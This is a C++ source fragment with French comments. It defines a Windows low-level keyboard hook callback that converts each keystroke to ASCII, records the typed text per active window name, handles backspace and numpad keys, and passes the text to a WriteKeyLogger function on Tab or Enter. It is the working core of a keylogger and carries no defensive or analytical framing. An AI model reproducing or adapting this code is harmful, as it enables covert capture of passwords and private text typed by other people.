 __declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam ) 
 {
	GString name = GetActiveWindowName();
	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN)) 
	{
		 // conversion du code -> ascii
		BYTE KeyState[256];
		WORD wBuf;
		char ch;
		// Structure pour récupération des informations
		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);
		/* Traitement récupération dec codes des touches */
		// Etat du clavier
		GetKeyboardState(KeyState);
		// Conversion code > ascii
		ToAscii(hooked.vkCode, hooked.scanCode ,KeyState,&wBuf,0);
		 //on rajoute les touches non traitées par le hook
		switch (hooked.vkCode)
		{
			case VK_TAB     : { WriteKeyLogger(name); break; }
			case VK_RETURN  : { WriteKeyLogger(name); break; }
			case VK_BACK    : { _map[name] = _map[name].Substr(0, _map[name].Size() - 1); break; }
			case VK_NUMPAD0 : { _map[name] += "0"; break; }
			case VK_NUMPAD1 : { _map[name] += "1"; break; }
			case VK_NUMPAD2 : { _map[name] += "2"; break; }
			case VK_NUMPAD3 : { _map[name] += "3"; break; }
			case VK_NUMPAD4 : { _map[name] += "4"; break; }
			case VK_NUMPAD5 : { _map[name] += "5"; break; }
			case VK_NUMPAD6 : { _map[name] += "6"; break; }
			case VK_NUMPAD7 : { _map[name] += "7"; break; }
			case VK_NUMPAD8 : { _map[name] += "8"; break; }
			case VK_NUMPAD9 : { _map[name] += "9"; break; }
			case VK_MULTIPLY: { _map[name] += "*"; break; }
			case VK_ADD     : { _map[name] += "+"; break; }
			case VK_SUBTRACT: { _map[name] += "-"; break; }
			case VK_DECIMAL : { _map[name] += "."; break; }
			case VK_DIVIDE  : { _map[name] += "/"; break; } 
			case VK_DELETE  : { printf("<Suppr>");break;}
			default : { // on affiche les touches tappées
				ch=((char)wBuf);
				_map[name] += ch;
				break;
				}

		}
	}
	return CallNextHookEx(hKeyHook, nCode,wParam,lParam);
}